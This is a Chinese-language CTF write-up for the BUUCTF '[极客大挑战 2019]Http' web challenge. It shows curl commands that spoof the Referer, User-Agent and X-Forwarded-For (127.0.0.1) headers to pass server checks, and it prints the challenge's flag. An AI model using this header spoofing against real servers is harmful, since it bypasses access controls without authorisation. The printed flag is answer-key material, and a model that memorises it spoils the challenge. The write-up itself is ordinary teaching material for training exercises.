# [极客大挑战 2019]Http

## 题目概述
一道 HTTP 请求头伪造题，需要依次伪造 Referer、User-Agent、X-Forwarded-For 三个请求头来通过服务器校验，最终获取 flag。

## 信息收集

访问题目首页，查看源码发现隐藏链接：

```html
<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>
```

该链接通过 `onclick="return false"` 阻止了正常点击跳转，但在源码中可见 `Secret.php`。

## 漏洞分析

**漏洞类型：** HTTP 请求头校验绕过

题目对 `Secret.php` 进行了三层请求头校验，每通过一层会提示下一层的要求：

1. **Referer 校验** — 页面提示 `It doesn't come from 'https://Sycsecret.buuoj.cn'`，需要伪造 Referer
2. **User-Agent 校验** — 页面提示 `Please use "Syclover" browser`，需要伪造 User-Agent 为 `Syclover`
3. **X-Forwarded-For 校验** — 页面提示 `No!!! you can only read this locally!!!`，需要伪造 X-Forwarded-For 为 `127.0.0.1`

## 利用过程

**第一步：访问首页发现隐藏链接**
```bash
curl -s http://target/ | grep -i secret
# 发现 Secret.php
```

**第二步：访问 Secret.php，伪造 Referer**
```bash
curl -s -H "Referer: https://Sycsecret.buuoj.cn" http://target/Secret.php
# 提示: Please use "Syclover" browser
```

**第三步：伪造 User-Agent**
```bash
curl -s -H "Referer: https://Sycsecret.buuoj.cn" \
        -H "User-Agent: Syclover" \
        http://target/Secret.php
# 提示: No!!! you can only read this locally!!!
```

**第四步：伪造 X-Forwarded-For，获取 flag**
```bash
curl -s -H "Referer: https://Sycsecret.buuoj.cn" \
        -H "User-Agent: Syclover" \
        -H "X-Forwarded-For: 127.0.0.1" \
        http://target/Secret.php
# flag{7c97966f-0c40-482d-b49d-bedbf537540a}
```

## 复现步骤
1. `curl -s http://target/` 查看源码，找到 `Secret.php`
2. 依次添加 `Referer: https://Sycsecret.buuoj.cn`、`User-Agent: Syclover`、`X-Forwarded-For: 127.0.0.1` 三个请求头
3. 访问 `Secret.php` 获取 flag

## 知识总结
- **解题套路：** 页面源码中隐藏链接（onclick 阻止、display:none 等）是常见考点，务必查看源码
- **HTTP 头伪造三件套：** Referer（来源校验）、User-Agent（浏览器校验）、X-Forwarded-For（IP 伪造）是 HTTP 头伪造最常见的三个考点
- **提示利用：** 服务器返回的错误提示直接指明了需要伪造哪个头，按提示依次伪造即可
- **同类题型：** BUUCTF 中大量 Web 入门题考察 HTTP 请求头知识，掌握 curl 的 `-H` 参数是基本功

## 注意事项
- X-Forwarded-For 伪造本地访问时用 `127.0.0.1` 或 `localhost`
- User-Agent 的值通常在提示中直接给出，照搬即可
- 查看页面源码时注意 `onclick="return false"`、`display:none`、`visibility:hidden` 等隐藏手段
